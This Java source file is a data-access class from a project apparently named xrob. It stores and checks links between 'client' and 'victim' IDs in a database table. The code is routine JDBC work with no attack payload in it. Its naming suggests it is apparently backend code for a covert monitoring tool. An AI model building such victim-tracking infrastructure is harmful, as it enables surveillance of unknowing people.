package com.theah64.xrob.api.database.tables;

import com.theah64.xrob.api.database.Connection;
import com.theah64.xrob.api.models.ClientVictimRelation;

import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;

/**
 * Created by theapache64 on 12/9/16.
 */
public class ClientVictimRelations extends BaseTable<ClientVictimRelation> {

    private static final String COLUMN_CLIENT_ID = "client_id";
    private static final java.lang.String COLUMN_VICTIM_ID = "victim_id";

    private ClientVictimRelations() {
    }

    private static final ClientVictimRelations instance = new ClientVictimRelations();

    public static ClientVictimRelations getInstance() {
        return instance;
    }

    public boolean isConnected(String clientId, String victimId) {
        return get(COLUMN_CLIENT_ID, clientId, COLUMN_VICTIM_ID, victimId) != null;
    }

    @Override
    public ClientVictimRelation get(String column1, String value1, String column2, String value2) {

        final String query = String.format("SELECT id FROM client_victim_relations WHERE %s = ? AND %s = ? LIMIT 1", column1, column2);

        final java.sql.Connection con = Connection.getConnection();
        ClientVictimRelation relation = null;

        try {

            final PreparedStatement ps = con.prepareStatement(query);
            ps.setString(1, value1);
            ps.setString(2, value2);

            final ResultSet rs = ps.executeQuery();

            if (rs.next()) {
                //Collecting relation
                final String id = rs.getString(COLUMN_ID);
                relation = new ClientVictimRelation(id, null, null);
            }

            rs.close();
            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        return relation;
    }

    @Override
    public boolean add(ClientVictimRelation cvr) {

        final String addVictimQuery = "INSERT INTO client_victim_relations (client_id,victim_id) VALUES (?,?);";
        final java.sql.Connection con = Connection.getConnection();

        //To track the success
        boolean isRelationAdded = false;

        try {
            final PreparedStatement ps = con.prepareStatement(addVictimQuery);

            ps.setString(1, cvr.getClientId());
            ps.setString(2, cvr.getVictimId());

            isRelationAdded = ps.executeUpdate() == 1;

            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        return isRelationAdded;
    }

    public boolean connect(String clientId, String victimId) {
        return add(new ClientVictimRelation(null, clientId, victimId));
    }
}
